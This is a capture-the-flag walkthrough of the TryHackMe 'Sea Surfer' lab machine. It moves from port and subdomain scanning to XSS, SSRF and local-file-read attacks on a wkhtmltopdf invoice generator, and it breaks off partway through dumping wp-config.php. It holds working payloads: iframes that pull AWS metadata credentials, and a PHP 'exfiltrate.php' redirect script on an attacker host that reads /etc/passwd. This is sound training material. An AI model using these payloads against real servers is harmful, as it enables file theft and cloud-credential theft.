# Sea Surfer — Writeup

## Overview
### Sea Surfer — Writeup
### Sea Surfer — Writeup
----
Ride the Wave!
----
![](https://i.imgur.com/yvuFbNQ.jpeg)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/137a8e8a8cdc4ba577b8f841b1d5293b.png)
Start Machine
It's a beautiful day to hit the beach and do some surfing.
_Please allow up to 5 minutes for the machine to boot up._
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.74.111 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.74.111:22
Open 10.10.74.111:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.74.111 [2 ports]
Discovered open port 22/tcp on 10.10.74.111
Discovered open port 80/tcp on 10.10.74.111
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.74.111
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.74.111.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.74.111
Host is up, received user-set (0.19s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 87e3d432cd51d29670ef5f482250ab67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyQtbtTbXITp+A3lHCXTmOYEd3nuF2kZuQ02sjsxLFIE31lelQ+yZMOCwzcC/MohqAcs2LLmfdVi2TJfuOVC0dZ6bkMUdbeF65UtptaUClLuxhdtMkZNxJlAgQSx8d0p3H+JnAmTD5CVeU/x0RlTKRzQDiynKtszcrWjWzZ6DGM7rWjTtGcYOaFObWN66bKrZtQOQw2Fp6LX5aNIqAoxhb3orPKjFUUlcdVzaesX2KBbJsNBDiEF3gGtoK6nJzi9L+NMFAK2Rl06G6vBqxYUc6PKL0M+ovoCEtxeZsH9/R2WqWZ3vB2B8PzqafYFP3chMMcdewG89CCdxmyyFuyGt/kf7L7OLJTWsYiJvLUPFAEyymn4GcfzIcOl/XXVr1hIoTOCDukS0dMWdAvnaaZOMharud9fowd+eAG3LowJnyu2O2OBg6pdpdQzuW9DFmy7etBIlbaSvG+l/8pmgJ3RWSLXDQEl5kZDGXLM6A3qcUqtSOK7ww9IvN8IYxlhyQ0kk=
|   256 27d137b0c53cb5816a7c368a2b639ab9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEhRgdpnS6QXS+haDKzUdKS0IP+HZz749jjQOx9ECJ+ypGOT6Q65NUeHaU49cqARe4kKi9/+Yl/W3U2J4wJKgBw=
|   256 7f131bcfe64551b909439a232f503c94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIZ39ZNVX7VJgmO8M/Vhb9lm35it42Ho7crlLqYhVhAT
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.79 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ curl 10.10.74.111 -I
HTTP/1.1 200 OK
Date: Mon, 10 Jul 2023 22:30:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 17 Apr 2022 18:54:09 GMT
ETag: "2aa6-5dcde2b3f2ff9"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
X-Backend-Server: seasurfer.thm
Content-Type: text/html

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts                                                  
10.10.74.111 seasurfer.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u seasurfer.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.seasurfer.thm" --hc 404 --hw 964
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://seasurfer.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload           
=====================================================================

000000387:   200        108 L    275 W      3072 Ch     "internal"  

or http://seasurfer.thm/news/

dude what was the site again where u could create receipts for customers? the computer is saying cant connect to intrenal.seasurfer.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.74.111 seasurfer.thm internal.seasurfer.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://seasurfer.thm/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://seasurfer.thm/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://seasurfer.thm/0000                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/0000/]
http://seasurfer.thm/.htaccess            (Status: 403) [Size: 278]
http://seasurfer.thm/.htpasswd            (Status: 403) [Size: 278]
http://seasurfer.thm/!                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/0                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/About                (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/A                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/Blog                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/Blog/]
http://seasurfer.thm/B                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/blog/]
http://seasurfer.thm/C                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/contact/]
http://seasurfer.thm/Contact              (Status: 301) [Size: 0] [--> http://seasurfer.thm/Contact/]
http://seasurfer.thm/H                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/home/]
http://seasurfer.thm/Home                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/Home/]
http://seasurfer.thm/N                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/new-website-is-up/]
http://seasurfer.thm/News                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/News/]
http://seasurfer.thm/S                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/sale/]
http://seasurfer.thm/a                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/ab                   (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/abo                  (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/about                (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/admin                (Status: 302) [Size: 0] [--> http://seasurfer.thm/wp-admin/]
http://seasurfer.thm/adminer              (Status: 301) [Size: 316] [--> http://seasurfer.thm/adminer/]

so http://seasurfer.thm/wp-admin/ to login and http://seasurfer.thm/adminer/ login mysql and pdf generator from subdomain internal

http://internal.seasurfer.thm/invoices/10072023-NMhNcqy3YbDUos3yT96F.pdf

<h1>1337</h1>

<script>document.write(document.location.href)</script>

Additional information: http://internal.seasurfer.thm/invoice.php?
name=a&payment=Credit+card&comment=%3Cscript%3Edocument.write%28document.location.href%29%3C%2Fscript%3E&item1=1&price1
HWjHNv6sJClQVULEFnPb

<img src=x onerror=document.write(navigator.appVersion)>
5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34

<img src=x onerror=document.write(1337)>

let's download the pdf

┌──(witty㉿kali)-[~]
└─$ pdfinfo 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf 
Title:           Receipt
Creator:         wkhtmltopdf 0.12.5
Producer:        Qt 4.8.7
CreationDate:    Mon Jul 10 18:51:40 2023 EDT
Custom Metadata: no
Metadata Stream: no
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           1
Encrypted:       no
Page size:       595 x 842 pts (A4)
Page rot:        0
File size:       53159 bytes
Optimized:       no
PDF version:     1.4

or

┌──(witty㉿kali)-[~]
└─$ exiftool 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf                  
ExifTool Version Number         : 12.57
File Name                       : 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf
Directory                       : .
File Size                       : 53 kB
File Modification Date/Time     : 2023:07:10 18:52:26-04:00
File Access Date/Time           : 2023:07:10 18:52:41-04:00
File Inode Change Date/Time     : 2023:07:10 18:52:26-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Receipt
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
Create Date                     : 2023:07:10 22:51:40Z
Page Count                      : 1

<iframe src="http://10.8.19.103:4444/> 

└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from seasurfer.thm [10.10.74.111] 55078
GET /%3E%20%3C/td%3E%3C/tr%3E%3C/table%3E%3C/td%3E%3C/tr%3E%3Ctr%20class= HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://internal.seasurfer.thm/invoice.php?name=a&payment=Credit+card&comment=%3Ciframe+src%3D%22http%3A%2F%2F10.8.19.103%3A4444%2F%3E+&item1=1&price1=1&id=10072023-kfEf4vxgqjpZF2Fylfn8
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.8.19.103:4444

wkhtmltopdf

`XSS` to `SSRF` to `LFI`

<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
<iframe src="file:///etc/passwd"> not work

[AWS Capture the Flag Write-Up (hey.com)](https://world.hey.com/alois/aws-capture-the-flag-write-up-e64fa089)

<iframe src="http://169.254.169.254/latest/dynamic/instance-identity/" height="500" width="500">

signature
rsa2048
document
pkcs7

retrieve a `SecretAccessKey`

<iframe src="http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance" height="1000" width="500">

Additional information: {
"Code" : "Success",
"LastUpdated" : "2023-07-10T22:41:40Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "ASIA2YR2KKQMY6K4737Z",
"SecretAccessKey" :
"DRm8wB8nWsTkQx/k025HNLCY6pK3fFT8f703hAz0",
"Token" :
"IQoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMSJHMEUCIEDq8w+SjTssBi9Lh8y+
aefW2/Ylt6gxE0PRiOgsgjFnAiEAzm/E+cnhw+v2hPGct7SdTGam7ZAJgROou
ruioJHXLLkqzwQIsP//////////ARADGgw3Mzk5MzA0Mjg0NDEiDEzm40kY8baCs
e4bJiqjBHep1ziyH3mj/0e1UBaBNc5cKbXsZIo9iAx4/4xwpwrLSjlsKsG8tc6v4
fVpSAlerKI1LbmotzEUizLe1HVSyrcdBbyaUBjgSjII7oq5nG/vBEvd5BtR0Bc/S
zzzHQcEMYsoqaoy6UrjhHzo8jER+Hz5nD6D1bPSZcAASs8uycb5GiiSRccVzk
GmDH562Tpz8hDmurfdyprQ5dvahEeM3C7iXo2GTgNJqMp2HmtF87tKaOFH
OdXGa7qagUOe/tOhawvIpMQ7GuwI5GBSfCqwXgF4FIFTn0X1tjbibHID+zny
WlN7cU/b5lDYXs6rYwqw/Jskg+tpXWI2eaTmxa+Ma8/y7gNXcz7CynoFElgf9
zzvjHNgslkEDLoOQJJVkr4+gisKt+YVYN8KyF6iVF2tpvU1P901YcU6RMyrP2e
KwjYYLLAgO74614aFXYefPZmO5C+3B1fg1K/4dFd+flJJtt9DS/3O9Y/4TIXjH3
3EG1AAzsWk3Vi2a/W3kSzmc4Yj6AfxYh1rby6RqaBFHK8HnHqMRjZLHhBEv
0K23akLGW2kPdgBm2OUHbE0UblbW07hBll0raqUd4/ZGMSmboGFuzrvAFN
oQdmzTEtFwZelgQJLBS2HlvtE57R6Z+TXzSC3Z+448C1Pag63F/km6tR/HD
XTU/IZAe190rIYNCClP0KMiuLNmRQrif4SB2aBXgbiBlvKOHtiQwaZ7rbQ2aAt
OVNrJ1Ew7JGypQY6kwJlGczY6qsnPCdNGVYH3PJmPl+6iSd6SB+RSPbPKSyfJ
BbPFrrWFQe1mMUqolvAZ02SNCdseGZSvNFNR9nTOHElhYfIWMsRd7wZVs
gchJQSytPiTOIA/f8XeUKcEzz0rQg/bzaTVipORkCHVhrBoSPWWxeWyZG3iCN
3B44d75jR0lL+QRhLtgbAEIKENlupHr3D8zlHTimB1d1Gdaj9J5PUFOtEbFEm
P4Z4LJh/I+txRt9fQ59TbeHbGGZz6nYd+oAhZjTPEfHIjtINV1FW+De6dEHJKZ
CJmnD9jc69baI+yFk/hgEheoVZuVBb8msJJbGaK16Wh/8XbfenTyTa3i85bZ5
9/J+KiD0dkx9DEYcKWAH7IA==",
"Expiration" : "2023-07-11T04:42:19Z"
}

[Write-up for Gemini Inc: 1 - My Learning Journey (kongwenbin.com)](https://kongwenbin.com/write-up-for-gemini-inc-1/)

┌──(witty㉿kali)-[~]
└─$ cat exfiltrate.php  
<?php header('location:file://'.$_REQUEST['x']); ?>

┌──(witty㉿kali)-[~]
└─$ php -S 0.0.0.0:1234 
[Mon Jul 10 19:07:35 2023] PHP 8.1.12 Development Server (http://0.0.0.0:1234) started

<iframe height="2000" width="800" src="http://10.8.19.103:1234/exfiltrate.php?x=/etc/passwd"></iframe>

Additional information:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false

┌──(witty㉿kali)-[~]
└─$ php -S 0.0.0.0:1234 
[Mon Jul 10 19:07:35 2023] PHP 8.1.12 Development Server (http://0.0.0.0:1234) started
[Mon Jul 10 19:08:11 2023] 10.10.74.111:42822 Accepted
[Mon Jul 10 19:08:11 2023] 10.10.74.111:42822 [302]: GET /exfiltrate.php?x=/etc/passwd

<iframe height="2000" width="800" src="http://10.8.19.103:1234/exfiltrate.php?x=/var/www/wordpress/wp-config.php"></iframe>

Additional information:
<?php
/**
* The base configuration for WordPress
*
* The wp-config.php creation script uses this file during the installation.
* You don't have to use the web site, you can copy this file to "wp-config.php"
* and fill in the values.
*
* This file contains the following configurations:
*
* * Database settings
